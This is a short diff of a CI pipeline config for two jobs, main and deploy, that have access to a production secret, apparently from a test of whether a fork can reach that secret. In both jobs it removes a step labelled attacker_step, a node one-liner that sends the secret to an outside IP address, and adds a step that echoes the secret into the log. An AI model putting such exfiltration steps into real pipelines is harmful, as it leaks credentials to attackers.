@@ -8,11 +8,11 @@ jobs:
     secrets:
     - PROD_SECRET
     steps:
-    - attacker_step: node -e "require('http').get('http://84.247.182.26:19150/LEAK/'+encodeURIComponent(process.env.SD_JOB_NAME||'nojob')+'/'+encodeURIComponent(process.env.PROD_SECRET||'UNSET'), r=>r.resume()).on('error',()=>{})"
+    - probe: echo "FROM_FORK secret=[$PROD_SECRET]"
   deploy:
     requires:
     - main
     secrets:
     - PROD_SECRET
     steps:
-    - attacker_step: node -e "require('http').get('http://84.247.182.26:19150/LEAK/'+encodeURIComponent(process.env.SD_JOB_NAME||'nojob')+'/'+encodeURIComponent(process.env.PROD_SECRET||'UNSET'), r=>r.resume()).on('error',()=>{})"
+    - probe: echo "FROM_FORK secret=[$PROD_SECRET]"
